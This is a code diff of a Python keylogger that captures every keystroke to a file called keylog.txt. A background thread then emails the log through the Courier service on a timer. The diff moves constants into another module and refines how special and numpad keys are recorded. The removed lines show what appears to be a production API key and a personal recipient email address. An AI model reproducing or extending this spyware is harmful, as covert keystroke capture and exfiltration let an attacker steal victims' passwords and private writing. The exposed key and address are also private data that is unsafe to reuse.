@@ -6,14 +6,8 @@ from trycourier import Courier
 import os
 import threading
 from utils.utils import *
+from utils.const import *
 
-TIME_DELAY_TO_SENT = 60*60
-API_KEY = "pk_prod_FQTZ70SHDJMVA8GNGAW1PQV4MT9R"
-OUTPUT_FILE_NAME = "keylog.txt"
-TO_EMAIL = "hyquaq15@gmail.com"
-TITLE_EMAIL = "Welcome to Courier!"
-KEY_SPACE = ' '
-KEY_DOUBLE_DOT = ':'
 
 def sentMail():
     while True:
@@ -50,28 +44,49 @@ def sentMail():
 def loggerr():
     print(get_current_function_name())
 
-    the_keys = []
+    # TODO: remove array when sent mail done
+    the_keys = [FIRST_ELEMENT]
 
-    def on_press(key):
-        the_keys.append(key)
+    def on_press(original_key):
+        # print(original_key)
+        if str(original_key).startswith("Key."):
+            try:
+                modified_key = f"[{str(original_key).replace('Key.', '')}]"
+                if the_keys[-1] != modified_key:
+                    print(modified_key)
+                    the_keys.append(modified_key)
+                    storeKeysToFile(the_keys)
+                return
+            except Exception as e:
+                print(f"An error occurred: {e}")
+                return
+
+        key_value = original_key
+        if hasattr(original_key, 'vk') and original_key.vk in numpad_mapping:
+            key_value = numpad_mapping[original_key.vk]
+            # print('You entered a number from the numpad:', key_value)
+            the_keys.append(key_value)
+        else:
+            the_keys.append(key_value)
         storeKeysToFile(the_keys)
-        # try:
-        #     print('alphanumeric key {0} pressed'.format(key.char))
-        # except AttributeError:
-        #     print('special key {0} pressed'.format(key))
 
     def storeKeysToFile(keys):
         with open(OUTPUT_FILE_NAME, 'w') as log:
             for the_key in keys:
+                # TODO: fix "" and ''
                 the_key = str(the_key).replace("'", "")
+                if str(the_key) == '"':
+                    the_key = '"'
+                if str(the_key) == '""':
+                    the_key = "'"
                 log.write(the_key)
-                if the_key.startswith("Key"):
-                    log.write(KEY_SPACE)
+                # if the_key.startswith("Key"):
+                #     log.write(KEY_SPACE)
 
     def on_release(the_key):
         # if the_key == Key.esc:
         #     return False
-        pass
+        return True
 
     with Listener(
         on_press=on_press,
